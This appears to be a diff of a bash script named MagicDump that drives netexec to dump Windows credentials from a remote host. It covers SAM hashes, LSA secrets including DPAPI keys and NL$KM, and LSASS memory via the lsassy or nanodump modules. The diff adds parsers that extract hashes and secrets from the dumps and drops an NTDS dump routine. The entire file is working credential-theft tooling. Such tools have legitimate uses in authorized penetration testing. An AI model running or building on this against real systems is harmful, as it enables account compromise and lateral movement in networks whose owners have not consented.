@@ -167,108 +167,101 @@ construct_base_cmd() {
   echo "$base_cmd"
 }
 
-# Function to execute SAM dump
+# Parsing Functions
+parse_sam_output() {
+  local output_file="$1"
+  echo -e "${GREEN}[SAM HASHES FOUND]:${RESET}"
+  grep -oP "^[^:]+:[0-9]+:[^:]+:[^:]+:::" "$output_file" || echo -e "${YELLOW}No SAM hashes found.${RESET}"
+}
+
+parse_lsa_output() {
+  local output_file="$1"
+  echo -e "${GREEN}[LSA SECRETS FOUND]:${RESET}"
+
+  # Use awk to extract relevant LSA secrets
+  awk '
+    /Dumping LSA secrets/ {secrets = 1; next}
+    secrets && /SMB.*:/ {
+      print "  " $0
+    }
+    secrets && /dpapi_[a-z]+key:/ {
+      print "  " $0
+    }
+    secrets && /NL\$KM:/ {
+      print "  " $0
+    }
+    secrets && !/SMB|dpapi|NL\$KM/ {exit}
+  ' "$output_file" | while read -r line; do
+    echo -e "${line}"
+  done || echo -e "${YELLOW}No LSA secrets found.${RESET}"
+}
+
+parse_lsass_output() {
+  local output_file="$1"
+  echo -e "${GREEN}[LSASS CREDENTIALS FOUND]:${RESET}"
+  grep -oP "[^ ]+\\\\[^ ]+ [0-9a-f]{32}" "$output_file" || echo -e "${YELLOW}No LSASS credentials found.${RESET}"
+}
+
+# Dump Functions
 dump_sam() {
   local output_file="$DUMP_DIR/SAM_dump_${TARGET_HOST}.txt"
   local cmd
-  cmd=$(construct_base_cmd)" --sam > '$output_file' 2>/dev/null"
+  cmd=$(construct_base_cmd)" --sam > '$output_file' 2>&1"
 
   add_log "Starting SAM dump using netexec..."
   if run_command "$cmd"; then
-    [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} SAM dump completed successfully. Output saved to $output_file"
     log_operation "SAM" "success" "\"file_path\": \"$output_file\""
     add_log "SAM dump saved to $output_file"
+    parse_sam_output "$output_file"
   else
-    [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} SAM dump failed. Check permissions or connectivity."
     log_operation "SAM" "failed" "\"error\": \"Failed to dump SAM\""
     add_warning "Failed to dump SAM on target $TARGET_HOST"
   fi
 }
 
-# Function to execute LSA dump
 dump_lsa() {
   local output_file="$DUMP_DIR/LSA_dump_${TARGET_HOST}.txt"
   local cmd
-  cmd=$(construct_base_cmd)" --lsa > '$output_file' 2>/dev/null"
+  cmd=$(construct_base_cmd)" --lsa > '$output_file' 2>&1"
 
   add_log "Starting LSA dump using netexec..."
   if run_command "$cmd"; then
-    [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} LSA dump completed successfully. Output saved to $output_file"
     log_operation "LSA" "success" "\"file_path\": \"$output_file\""
     add_log "LSA dump saved to $output_file"
+    parse_lsa_output "$output_file"
   else
-    [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} LSA dump failed. Check permissions or connectivity."
     log_operation "LSA" "failed" "\"error\": \"Failed to dump LSA\""
     add_warning "Failed to dump LSA on target $TARGET_HOST"
   fi
 }
 
-# Function to execute LSASS dump
 dump_lsass() {
-  local method="${1:-lsassy}"  # Default to "lsassy" if no method is provided
+  local method="${1:-lsassy}"
   local output_file="$DUMP_DIR/LSASS_dump_${TARGET_HOST}.dmp"
   local cmd
   cmd=$(construct_base_cmd)
 
-  # Append the appropriate module to the command
   case "$method" in
-    nanodump)
-      cmd+=" -M nanodump"
-      ;;
-    lsassy)
-      cmd+=" -M lsassy"
-      ;;
-    *)
-      echo -e "${RED}[ERROR]${RESET} Invalid method '$method' for LSASS dump. Use 'lsassy' or 'nanodump'."
-      return 1
-      ;;
+    nanodump) cmd+=" -M nanodump" ;;
+    lsassy) cmd+=" -M lsassy" ;;
+    *) echo -e "${RED}[ERROR] Invalid method for LSASS dump.${RESET}"; return 1 ;;
   esac
 
   add_log "Starting LSASS dump using $method..."
-  if run_command "$cmd > '$output_file' 2>/dev/null"; then
-    [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} LSASS dump completed successfully using $method. Output saved to $output_file"
+  if run_command "$cmd > '$output_file' 2>&1"; then
     log_operation "LSASS" "success" "\"file_path\": \"$output_file\", \"method\": \"$method\""
     add_log "LSASS dump saved to $output_file"
+    parse_lsass_output "$output_file"
   else
-    [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} LSASS dump failed using $method. Check permissions or connectivity."
-    log_operation "LSASS" "failed" "\"error\": \"Failed to dump LSASS using $method\""
-    add_warning "Failed to dump LSASS on target $TARGET_HOST using $method"
+    log_operation "LSASS" "failed" "\"error\": \"Failed to dump LSASS\""
+    add_warning "Failed to dump LSASS on target $TARGET_HOST"
   fi
 }
 
-# Function to execute NTDS dump using ntdsutil
-dump_ntds() {
-  local output_file="$DUMP_DIR/NTDS_dump_${TARGET_HOST}.txt"
-  local cmd
-  cmd=$(construct_base_cmd)" -M ntdsutil > '$output_file' 2>/dev/null"
-
-  add_log "Starting NTDS dump using ntdsutil..."
-  if run_command "$cmd"; then
-    [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} NTDS dump completed successfully. Output saved to $output_file"
-    log_operation "NTDS" "success" "\"file_path\": \"$output_file\", \"method\": \"ntdsutil\""
-    add_log "NTDS dump saved to $output_file"
-  else
-    [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} NTDS dump failed. Check permissions or connectivity."
-    log_operation "NTDS" "failed" "\"error\": \"Failed to dump NTDS using ntdsutil\""
-    add_warning "Failed to dump NTDS on target $TARGET_HOST using ntdsutil"
-  fi
-}
-
-# Main script logic
+# Main Logic
 add_log "Starting MagicDump against target $TARGET_HOST"
 add_log "Authenticating as user '$USERNAME'..."
-
-# Execute SAM dump
 dump_sam
-
-# Execute LSA dump
 dump_lsa
-
-# Execute LSASS dump
 dump_lsass
-
-# Execute NTDS dump
-dump_ntds
-
-# Display summary to user (without JSON dump)
 echo -e "${GREEN}[INFO]${RESET} Dumping complete. Logs saved to $LOG_FILE."
